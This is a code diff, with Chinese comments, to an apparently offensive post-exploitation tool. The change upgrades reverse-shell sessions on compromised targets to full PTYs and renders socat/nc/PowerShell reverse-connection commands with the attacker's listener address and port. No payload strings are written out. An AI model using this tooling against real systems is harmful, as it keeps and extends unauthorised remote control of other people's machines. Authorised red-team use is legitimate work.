@@ -11,6 +11,7 @@
 from __future__ import annotations
 
 import re
+import time
 from dataclasses import dataclass
 from typing import Optional
 
@@ -211,22 +212,88 @@ def technique_kind(fix: dict) -> str:
     return "inline"
 
 
+def is_reverse_session(session: SessionBase) -> bool:
+    """是否反弹（回连）通道会话：这类通道本身就是交互 shell，PTY 技法直接下发即可。"""
+    return getattr(session, "kind", "") in ("reverse", "reverse-shell")
+
+
+def render_technique_cmd(cmd: str, lhost: str = "127.0.0.1", lport: int = 4444) -> str:
+    """技法命令里的占位符按当前攻击机地址/端口渲染（注释行剔除后拼成单行）。"""
+    lines = [ln.strip() for ln in (cmd or "").splitlines()
+             if ln.strip() and not ln.strip().startswith("#")]
+    text = "; ".join(lines) or (cmd or "")
+    return (text.replace("$LHOST", str(lhost)).replace("$LPORT", str(lport))
+                .replace("$IP", str(lhost)))
+
+
+def _upgrade_via_channel(session: SessionBase, fix: dict) -> dict:
+    """反弹通道上执行 PTY 技法：原始写入通道 → 等 PTY 起来 → 真实回读验证。
+
+    为什么要走原始写入：该通道的目标侧已经被一个交互 shell 占着，PTY 技法是
+    「在当前 shell 里套一层 PTY」（pty.spawn / script），经哨兵 exec 下发会与
+    新拉起的 PTY 抢同一份输出；写入后统一用 PTY 验证探针回读判定。
+    """
+    write = getattr(session, "write_raw", None)
+    if write is None:
+        return {"hasPty": False, "reason": "该会话不支持原始通道写入", "summary": "通道不支持"}
+    cmd = render_technique_cmd(fix.get("cmd", ""))
+    if not cmd:
+        return {"hasPty": False, "reason": "技法命令为空", "summary": "无可执行命令"}
+    try:
+        write(cmd + "\n")
+    except OSError as e:
+        return {"hasPty": False, "reason": f"通道写入失败：{e}", "summary": "通道写入失败"}
+    time.sleep(1.2)  # 给目标侧把 PTY 拉起来的时间
+    try:
+        res = session.exec(PTY_VERIFY_INNER, timeout=12)
+    except SessionError as e:
+        return {"hasPty": False, "execOk": False, "cmd": cmd,
+                "reason": str(e), "summary": "PTY 验证失败"}
+    verdict = parse_pty_verify(res.output or "")
+    verdict["execOk"] = res.ok
+    verdict["viaChannel"] = True
+    verdict["cmd"] = cmd
+    if verdict["hasPty"]:
+        verdict["summary"] = f"已在反弹通道内拉起 PTY（{verdict.get('tty') or 'pts'}）"
+    else:
+        verdict["reason"] = res.error or "PTY 内验证未通过（缺 pts / TERM=dumb / stty 不可用）"
+    return verdict
+
+
 def upgrade(session: SessionBase, fix: dict, lhost: str = "127.0.0.1", lport: int = 4444) -> dict:
     """执行固化技法并依据真实回显判定 PTY。
 
+    - 反弹通道（kind=reverse-shell）：技法命令直接写进通道（它本身就是交互 shell），
+      再用 PTY 验证探针回读判定；
     - pty 类（python/script）：在目标侧真实拉起 PTY 并在其内执行验证命令；
       判定依据 = PTY 内 `tty` 输出 pts、TERM≠dumb、`stty size` 返回行列。
     - inline 类（env 修正 / reset / cmd 加固）：真实执行 + 回显确认。
-    - reverse 类（socat/nc/PowerShell 反向）：需攻击端监听，随 MS3 回连监听启用。
+    - reverse 类（socat/nc/PowerShell 反向）：需要攻击机先开监听，返回按当前攻击机
+      地址渲染好的命令与明确指引（不再是一句「待 MS3」的占位文案）。
     """
     kind = technique_kind(fix)
     fid = fix.get("id")
 
+    if is_reverse_session(session):
+        if kind in ("pty", "inline"):
+            return _upgrade_via_channel(session, fix)
+        if kind == "reverse":
+            return {
+                "hasPty": False, "fallback": "channel",
+                "cmd": render_technique_cmd(fix.get("cmd", ""), lhost, lport),
+                "reason": f"当前会话已是反弹交互通道，无需「{fix.get('name')}」再拉一条反向连接；"
+                          "想要完整 PTY 请用 Python PTY / script 技法（会直接在当前通道内生效）。",
+                "summary": "已是反弹通道，反向技法不适用",
+            }
+
     if kind == "reverse":
         return {
-            "pivothubFallback": False, "hasPty": False,
-            "reason": f"技法「{fix.get('name')}」需要攻击端监听回连，将随 MS3 回连监听一起启用",
-            "summary": "反向通道技法待 MS3 回连监听",
+            "hasPty": False, "execOk": False,
+            "cmd": render_technique_cmd(fix.get("cmd", ""), lhost, lport),
+            "reason": "该技法需要攻击机先开监听：到「反弹 Shell」页开好监听（地址/端口同上），"
+                      "用「② 发送到该会话」下发即可自动登记会话。命令行已按当前攻击机地址渲染，"
+                      "也可直接复制到本会话执行。",
+            "summary": "反向技法需回连监听（命令已渲染）",
         }
 
     if kind == "pty":
@@ -244,11 +311,7 @@ def upgrade(session: SessionBase, fix: dict, lhost: str = "127.0.0.1", lport: in
         return verdict
 
     # inline：真实执行技法命令
-    cmd = fix.get("cmd", "")
-    # 注释行剔除，变量替换（$LHOST/$LPORT 供反向技法使用）
-    lines = [ln for ln in cmd.splitlines() if ln.strip() and not ln.strip().startswith("#")]
-    exec_cmd = "; ".join(x.strip() for x in lines) or cmd
-    exec_cmd = exec_cmd.replace("$LHOST", lhost).replace("$LPORT", str(lport))
+    exec_cmd = render_technique_cmd(fix.get("cmd", ""), lhost, lport)
     res = session.exec(exec_cmd)
     out: dict = {"hasPty": False, "execOk": res.ok, "raw": res.output, "error": res.error}
     if res.ok and fid == "lx-env":
